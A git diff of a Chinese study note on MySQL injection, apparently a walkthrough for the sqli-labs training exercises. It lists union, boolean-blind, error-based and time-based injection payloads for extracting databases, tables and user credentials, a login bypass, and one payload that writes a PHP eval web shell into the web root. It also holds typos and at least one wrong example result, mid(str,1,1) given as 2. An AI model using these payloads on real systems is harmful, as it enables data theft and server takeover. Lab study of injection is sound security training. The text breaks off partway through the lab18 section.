@@ -1,7 +1,18 @@
-[TOC]
+
+
+--------------
+
+# 1.手工注入
+
+## 系统函数
+
+-   version()--Mysql版本
+-   user()--数据库用户名
+-   database()--数据库名
+-   @@datadir--数据库路径
+-   @@version_compile_os--操作系统版本
 
 ## 常用函数
-
 
 | 函数名称             | 函数功能           | 函数名称       | 函数功能                                       |
 | -------------------- | ------------------ | -------------- | ---------------------------------------------- |
@@ -30,50 +41,127 @@
 | extractvalue() | 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：XPath_String (Xpath 格式的字符串) 作用：从目标 XML 中返回包含所查询值的字符串 |
 | updatexml()    | 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：XPath_String (Xpath 格式的字符串) 第三个参数：new_value，String 格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值 |
 
-## Less1
+### 字符串连接函数
 
->   源码：
->   `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`
+concat(),group_concat(),concat_ws()
 
-**如果单引号没有报错：将magic_quotes_gpc改为off**
+### 1. concat()
 
-**order by 之后，尽心union select 的时候，要将id 改为一个不存在的值**
+​    首先联合注入（union）要求前后选择的列数要相同，假设只有id一个列，但我们想要id和user时，就可以用concat()。
 
-1.  database()查看当前数据库，或者group_concat(schema_name) from information_schema.schemata--+
+比如：
 
-2.  group_concat(table_name) from information_schema.tables where table_schema='security'--+
+​	`concat(id,',',user)`，那么返回为：	`1,admin`
 
-3.  group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+
+### 2. concat_ws()
 
-4.  group_concat(id,username,password),3 from security.users--+
+CONCAT With Separator，是concat的一种特殊形式、
 
-    或：
+第一个参数是其他参数的分隔符，可以是一个字符串，也可以是其他参数，如果分割符为null那么结果为null，函数会忽略任何分隔符参数后的 NULL 值。
 
-    group_concat(id,'\~',username,'\~',password),3 from security.users where id=2--+
+但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）。
 
-## Less2
+**用法：**
 
->   源码：
->   `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`
+​	`concat_ws(separator,str1,str2,...)`
 
-**输入id=2-1**，发生变化，是数字型注入
+### 3. group_concat()
 
-## Less3
+### 字符串截取常用函数
 
->   源码：
->   `$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";`
+三大法宝：mid(),substr(),left()
 
-字符型，闭合为')
+### 1. mid()
 
-## Less4
+mid(column_name,start,length)
 
->   源码
->   `$id = '"' . $id . '"';`
->   `$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";`
+| **参数**    | **描述**                                                    |
+| ----------- | ----------------------------------------------------------- |
+| column_name | 必需。要提取字符的字段。                                    |
+| start       | 必需。规定开始位置（起始值是 1）。                          |
+| length      | 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。 |
 
-使用双引号和括号闭合
+eg：str=123456，，，，mid(str,1,1) 结果为2
 
-## Less5
+sql示例：
+
+1.  mid(databases(),1,1)>'a'，查看数据库名第一位，mid(databases(),2,1)查看数据库名第二位，依次查看个位字符。
+2.  MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。
+
+### 2. substr()
+
+​	substr()与substring()函数使用的功能是一样的。
+
+​	substr(string,start,length) 
+
+### 3. left()
+
+left ( string, n )    string为要截取的字符串，n为长度。
+
+### 4.ord()
+
+返回第一个字符的ASCII码
+
+-----------
+
+```
+猜数据库 
+select group_concat(schema_name) from information_schema.schemata 
+猜某库的数据表 
+select table_name from information_schema.tables where table_schema=’xxxxx’ 
+猜某表的所有列 
+Select column_name from information_schema.columns where table_name=’xxxxx’
+```
+
+找到注入点后：
+
+order by查是几列
+
+union select ,**这时的id要改为一个不存在的值**
+
+database() 查看当前数据库
+
+或者：group_concat(schema_name) from information_schema.schemata
+
+假设得到数据库：security
+
+group_concat(table_name) from information_schema.tables where table_schema='security'--+
+
+假设得到表：users
+
+group_concat(id,username,password) from security.users
+
+或者：
+
+group_concat(id,'\~',username,'\~',password) from security.users where id=2--+
+
+以上是大致步骤
+
+
+
+-------------------
+
+# 2.工具注入
+
+
+
+
+
+----------------------------
+
+# 3.sqllab通关
+
+## lab1
+
+>   源码：`$sql="SELECT * FROM users WHERE id='$​​id' LIMIT 0,1";`
+
+**输入ID=2-1，与1相同，发生变化**,是数字型注入
+
+## lab2-4
+
+仅仅是闭合方式的改变
+
+## lab5
 
 ```php
 {
@@ -98,7 +186,7 @@
 	else { echo "Please input the ID as parameter with numeric value";}
 ```
 
-### 基于布尔的盲注
+## 盲注-基于布尔
 
 只有显示或不显示，比如：
 
@@ -110,9 +198,9 @@
 
  1.获取数据库名：
 
-先获取数据库长度后...
+​	先获取数据库长度后...
 
-二分......
+​	二分......
 
 猜测数据库第一位：
 
@@ -155,11 +243,7 @@ limit 1,1
 
 >   id=2' and (select length(column_name) from information_schema.columns where table_name=emails limit 0,1)=1--+
 
-
-
 >   id=1' and ascii(substr((selece colunm_name from information_schema.columns where table_name=emails limit 0,1),0,1))='a'--+
-
-
 
 或：
 
@@ -189,7 +273,9 @@ limit 1,1
 
 >   id=1'and ascii(substr((select email_id from emails limit 0,1),1,1))>'a'--+
 
-### 基于报错的盲注
+**布尔盲注脚本网上一堆，可以尝试自己手写**
+
+## 盲注-基于报错
 
 由于源代码中出现了`print_r(mysql_error)`，导致报错注入的可行，若是源码中未将错误信息打印，则不能进行报错注入
 
@@ -216,14 +302,11 @@ limit 1,1
 
 等等等，和正常注入都一样了......
 
-## Less6
+## lab6
 
-闭合与less5不同
+只是与lab5 的闭合不同
 
->   `$id = '"'.$id.'"';`
->   `$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";`
-
-## Less7
+## lab7
 
 这关是向服务器写一句话写入文件，之后菜刀连接。
 
@@ -245,17 +328,17 @@ secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FIL
 
 >   ?id=-1')) union select 1,"<?php @eval($_POST['chopper']);?>",3  into outfile "D:\\phpStudy\\PHPTutorial\\WWW\\123456.php" --+
 
-## Less8
+## lab8
 
 单引号
 
 当然，布尔和时间盲注也OK。但是报错注入就不OK了。
 
-## Less9
+## lab9
 
-单引号闭合的时间注入
+单引号闭合的时间盲注
 
-### 基于时间的盲注
+## 盲注-基于时间
 
 猜库：
 
@@ -281,13 +364,13 @@ secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FIL
 
 >   id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+
 
-## Less10
+## lab10
 
 双引号闭合的时间注入
 
 和上一关一样。
 
-## Less11
+## lab11
 
 username： admin' #
 
@@ -295,29 +378,29 @@ username： admin' #
 
 等等等，后面的和get的就都一样了。
 
-## Less12
+## lab12
 
 双引号和括号
 
-其他和Less11相同
+其他和lab11相同
 
-## Less13
+## lab13
 
 将提示信息都注释掉了，可以采用布尔盲注。
 
-## Less14
+## lab14
 
 双引号，报错注入
 
-## Less15
+## lab15
 
 单引号，可以布尔盲注或时间盲注。
 
-## Less16
+## lab16
 
 双引号，同15
 
-## Less17
+## lab17
 
 ```php
 function check_input($value)
@@ -371,6 +454,6 @@ function check_input($value)
 
 对usname进行了，上述过滤，但是password没有，所以对password进行注入。
 
-## Less18
+## lab18
 
 这关对uname和passwd都进行了检查，
